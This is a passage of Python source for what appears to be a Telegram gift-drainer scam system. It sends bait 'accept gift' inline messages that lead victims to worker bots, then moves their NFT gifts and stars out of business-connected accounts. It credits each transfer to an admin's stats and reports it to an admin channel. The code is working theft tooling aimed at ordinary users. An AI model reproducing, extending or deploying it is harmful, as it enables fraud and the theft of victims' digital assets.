    except Exception as e:
        stats["errors"] += 1
        transfer_logger.error(f"❗️ Критическая ошибка в процессе передачи: {e}")

    finally:
        transfer_logger.info("=== Итоговая сводка передачи (отправляется админу) ===")

        summary = build_summary(
            business_user_id, stats, successful_nfts, hold_nfts, transfer_disabled_msgs
        )

        await send_log(admin.telegram_id, summary)
        transfer_logger.info("Сводка отправлена админу")

        stars_total = stats["stars_transferred"]

        try:
            await update_admin_stats(
                session,
                admin,
                nft=stats["nft_success"],
                regular=0,
                stars=stars_total
            )
            await update_global_stats(
                session,
                nft=stats["nft_success"],
                regular=0,
                stars=stars_total
            )
            transfer_logger.info(f"[STATS_UPDATED] Admin {admin.telegram_id} (NFT={stats['nft_success']}, Stars={stars_total})")
        except Exception as e:
            transfer_logger.error(f"[STATS_UPDATE_ERROR] {e}")

        if stats["stars_really_transferred"] or stats["nft_success"] > 0:
            async def send_log_in_background():
                try:
                    await send_admin_transfer_log_to_channel(
                        admin.telegram_id,
                        stars_total,
                        stats["nft_success"]
                    )
                    transfer_logger.info("Лог о переводе отправлен в админ-канал")
                except Exception as e:
                    transfer_logger.error(f"[SEND_LOG_TO_CHANNEL_ERROR] {e}")

            asyncio.create_task(send_log_in_background())

async def update_global_stats(session, nft=0, regular=0, stars=0):
    stats = await session.scalar(select(GlobalStats).limit(1))
    if not stats:
        stats = GlobalStats()
        session.add(stats)
        await session.commit()
        await session.refresh(stats)

    stats.daily_gifts_unique += nft
    stats.daily_stars_sent += stars

    stats.total_gifts_unique += nft
    stats.total_stars_sent += stars

    await session.commit()

async def update_admin_stats(session, admin: Admin, nft=0, regular=0, stars=0):
    admin.gifts_unique_sent += nft
    admin.stars_sent += stars

    admin.daily_gifts_unique += nft
    admin.daily_stars_sent += stars

    await session.commit()

async def handle_webhook_inline_query(data, bot, token, request):
    async with Session() as session:
        userbot = await session.scalar(select(WorkerBot).where(WorkerBot.token == token))
        if not userbot or not userbot.username:
            return web.Response()

        if not userbot.custom_template_id:
            dp = Dispatcher(storage=MemoryStorage())
            router = Router()

            @router.inline_query(F.query)
            async def inline_handler(inline_query: InlineQuery):
                results = [
                    InlineQueryResultArticle(
                        id="no-template",
                        title="❗️ У вас не подключён шаблон",
                        input_message_content=InputTextMessageContent(
                            message_text="<b>❗️ Для работы инлайн необходимо подключить шаблон</b>",
                            parse_mode="HTML"
                        )
                    )
                ]
                await inline_query.answer(results, cache_time=1, is_personal=True)

            dp.include_router(router)
            handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
            return await handler.handle(request)

        custom_gift = await session.get(CustomGift, userbot.custom_template_id)
        if not custom_gift:
            dp = Dispatcher(storage=MemoryStorage())
            router = Router()

            @router.inline_query(F.query)
            async def inline_handler(inline_query: InlineQuery):
                results = [
                    InlineQueryResultArticle(
                        id="no-template",
                        title="❗️ У вас не подключён шаблон",
                        input_message_content=InputTextMessageContent(
                            message_text="<b>❗️ Для работы инлайн необходимо подключить шаблон</b>",
                            parse_mode="HTML"
                        )
                    )
                ]
                await inline_query.answer(results, cache_time=1, is_personal=True)

            dp.include_router(router)
            handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
            return await handler.handle(request)

    try:
        slugs = json.loads(custom_gift.slugs)
    except Exception:
        slugs = []

    dp = Dispatcher(storage=MemoryStorage())
    router = Router()

    @router.inline_query(F.query)
    async def inline_handler(inline_query: InlineQuery):
        results = []
        for slug in slugs:
            slug = slug.strip().replace('"', '').replace("'", "")
            title = slug.split("-")[0]
            message_text = custom_gift.message_text or "<i>ТЕСТ</i>"
            button_text = custom_gift.button_text or "🎁 Принять"
            url = f"https://t.me/nft/{slug}"

            ref_url = f"https://t.me/{userbot.username}?start=ref_{userbot.owner_id}_{slug}"

            results.append(
                InlineQueryResultArticle(
                    id=f"{slug}-{title}",
                    title=title,
                    input_message_content=InputTextMessageContent(
                        message_text=f"<b><a href='{url}'>{title}</a></b>\n\n{message_text}",
                        parse_mode="HTML"
                    ),
                    reply_markup=InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text=button_text, url=ref_url)]
                        ]
                    )
                )
            )

        await inline_query.answer(results, cache_time=1, is_personal=True)

    dp.include_router(router)
    handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    return await handler.handle(request)

async def register_worker_routes(app: web.Application):
    async def webhook_handler(request: web.Request):
        token = request.match_info["token"]
        try:
            data = await request.json()
        except Exception:
            print(f"[WebhookHandler] Ошибка разбора JSON для токена {token}")
            return web.Response(status=400, text="Invalid JSON")

        bot = get_cached_bot(token)
        if "inline_query" in data:
            return await handle_webhook_inline_query(data, bot, token, request)
        await handle_webhook_business_connection(data, bot)
        await handle_update(data, bot)

        return web.Response()

    app.router.add_post("/worker_webhook/{token}", webhook_handler)
    print("[register_worker_routes] Маршрут /worker_webhook/{token} зарегистрирован")

    async def setup_webhooks():
        async with Session() as session:
            try:
                result = await session.execute(select(WorkerBot))
                worker_bots = result.scalars().all()
                print(f"[register_worker_routes] Получено воркер-ботов из БД: {len(worker_bots)}")
            except Exception as e:
                print(f"[register_worker_routes] Ошибка при получении воркер-ботов из БД: {e}")
                return

        rate_limit = 10  
        delay = 1 / rate_limit

        for worker in worker_bots:
            bot = get_cached_bot(worker.token)
            webhook_url = f"{app.get('webhook_host', '')}/worker_webhook/{worker.token}"

            try:
                print(f"[register_worker_routes] Ставим вебхук для @{worker.username} на {webhook_url}")
                await bot.set_webhook(webhook_url)
                print(f"[register_worker_routes] Webhook установлен для @{worker.username}")
            except Exception as e:
                print(f"[register_worker_routes] Ошибка при установке webhook для @{worker.username}: {e}")

            await asyncio.sleep(delay)

    asyncio.create_task(setup_webhooks())  